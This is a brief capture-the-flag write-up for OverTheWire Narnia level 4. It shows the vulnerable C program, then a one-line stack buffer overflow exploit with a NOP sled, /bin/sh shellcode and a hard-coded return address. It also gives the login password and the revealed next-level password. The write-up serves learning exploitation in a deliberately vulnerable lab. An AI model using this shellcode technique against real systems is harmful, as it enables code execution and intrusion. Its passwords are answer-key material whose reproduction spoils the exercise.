# narnia 4

    # ssh narnia4@narnia.labs.overthewire.org
    password: thaenohtai

    # cat /games/narnia/narnia4.c

    #include <string.h>
    #include <stdlib.h>
    #include <stdio.h>
    #include <ctype.h>

    extern char **environ;

    int main(int argc,char **argv){
        int i;
        char buffer[256];

        for(i = 0; environ[i] != NULL; i++)
            memset(environ[i], '\0', strlen(environ[i]));

        if(argc>1)
            strcpy(buffer,argv[1]);

        return 0;
    }

    # /games/narnia/narnia4 `python -c 'print "\x90"*219+"\x31\xc0\x99\xb0\x0b\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x89\xe2\x53\x89\xe1\xcd\x80"+"\x90"*27+"\xf0\xd4\xff\xff"'`
    # cat /etc/narnia_pass/narnia5
    faimahchiy

